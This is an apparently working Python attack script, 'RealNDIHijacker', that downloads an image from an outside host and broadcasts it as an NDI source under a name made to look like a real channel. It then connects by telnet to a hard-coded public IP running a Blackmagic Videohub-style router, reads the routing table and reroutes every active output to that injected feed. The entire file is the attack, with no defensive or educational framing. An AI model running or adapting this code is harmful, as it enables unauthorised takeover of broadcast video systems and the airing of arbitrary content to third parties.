#!/usr/bin/env python3
import numpy as np
import numpy_ndi as ndi
from PIL import Image
import requests
import io
import time
import threading
import telnetlib
import re
import socket

VIDEOHUB_IP = "66.44.213.48"
VIDEOHUB_PORT = 9990
PNG_URL = "https://i.postimg.cc/tJq1ZFH3/pat.png"

class RealNDIHijacker:
    def __init__(self):
        self.ndi_name = f"{socket.gethostname()}-LIVE-CH3-403"  # Nome REAL Videohub-style
        self.width, self.height = 1920, 1080
        self.fps = 60
        self.ndi_send = None
        self.running = False
        self.png_frame = None
        self.active_channels = []
    
    def download_real_png(self):
        print("[+] Downloading REAL PNG payload...")
        resp = requests.get(PNG_URL)
        img = Image.open(io.BytesIO(resp.content)).convert('RGBA')
        img = img.resize((self.width, self.height), Image.Resampling.LANCZOS)
        self.png_frame = np.array(img, dtype=np.uint8)
        print(f"[+] REAL PNG: {self.width}x{self.height} RGBA ready")
    
    def init_ndi_sender(self):
        """NDI sender REAL con metadata Videohub"""
        ndi.initialize()
        send_settings = ndi.SendCreate()
        send_settings.ndi_name = self.ndi_name
        send_settings.clock_video = True
        send_settings.clock_audio = False
        self.ndi_send = ndi.send_create(send_settings)
        print(f"[+] REAL NDI '{self.ndi_name}' 1080p{self.fps} broadcast")
    
    def stream_loop(self):
        """Stream PNG loop 60fps REAL"""
        while self.running:
            video_frame = ndi.VideoFrameV2()
            video_frame.xres = self.width
            video_frame.yres = self.height
            video_frame.FourCC = ndi.FOURCC_TYPE_BGRX  # Broadcast format
            video_frame.p_data = self.png_frame.ctypes.data
            video_frame.line_stride_in_bytes = self.width * 4
            video_frame.frame_rate_N = self.fps
            video_frame.frame_rate_D = 1
            video_frame.picture_aspect_ratio = 16.0/9.0
            video_frame.frame_format_type = ndi.FRAME_FORMAT_TYPE_PROGRESSIVE
            
            self.ndi_send.send_video_v2(video_frame)
            time.sleep(1.0/self.fps)
    
    def discover_active_channels(self):
        """Scopre TUTTI i CH attivi sul Videohub"""
        print(f"[+] Discovering active channels on {VIDEOHUB_IP}:9990...")
        try:
            tn = telnetlib.Telnet(VIDEOHUB_IP, VIDEOHUB_PORT, timeout=10)
            tn.write(b"VIDEO ROUTING\n")
            routing_table = tn.read_until(b"\n", timeout=5).decode('ascii', errors='ignore')
            tn.close()
            
            # Parse routing table: OUT X Y = output X routato a input Y
            self.active_channels = []
            for line in routing_table.split('\n'):
                match = re.match(r'OUT\s+(\d+)\s+(\d+)', line.strip())
                if match:
                    out_ch, input_src = int(match.group(1)), int(match.group(2))
                    self.active_channels.append((out_ch, input_src))
            
            print(f"[+] Found {len(self.active_channels)} active channels: {self.active_channels}")
            return True
        except:
            print("[-] Videohub discovery failed")
            return False
    
    def hijack_all_channels(self):
        """Hijacka TUTTI i CH -> NDI input (12 o primo libero)"""
        if not self.active_channels:
            print("[-] No channels to hijack")
            return
        
        ndi_input = 12  # NDI input standard Videohub
        
        try:
            tn = telnetlib.Telnet(VIDEOHUB_IP, VIDEOHUB_PORT, timeout=5)
            hijacked = 0
            for out_ch, _ in self.active_channels:
                cmd = f"OUT {out_ch} {ndi_input}\n"
                tn.write(cmd.encode('ascii'))
                print(f"[+] HIJACKED CH{out_ch} -> NDI:{ndi_input}")
                hijacked += 1
            
            tn.write(b"VIDEO ROUTING\n")
            print("[+] NEW ROUTING:", tn.read_until(b"\n", timeout=2).decode())
            tn.close()
            print(f"[+] HIJACKED {hijacked}/{len(self.active_channels)} channels!")
        except Exception as e:
            print(f"[-] Hijack error: {e}")
    
    def run_real(self):
        self.download_real_png()
        self.init_ndi_sender()
        
        if self.discover_active_channels():
            time.sleep(1)  # NDI discovery
            self.hijack_all_channels()
        
        self.running = True
        video_thread = threading.Thread(target=self.stream_loop, daemon=True)
        video_thread.start()
        
        print(f"[*] REAL HIJACK ACTIVE su {self.ndi_name}")
        print("[*] Monitor: vlc ndi://{self.ndi_name}")
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            ndi.send_destroy(self.ndi_send)
            ndi.destroy()
            print("\n[+] Hijack stopped")

if __name__ == "__main__":
    hijacker = RealNDIHijacker()
    hijacker.run_real()
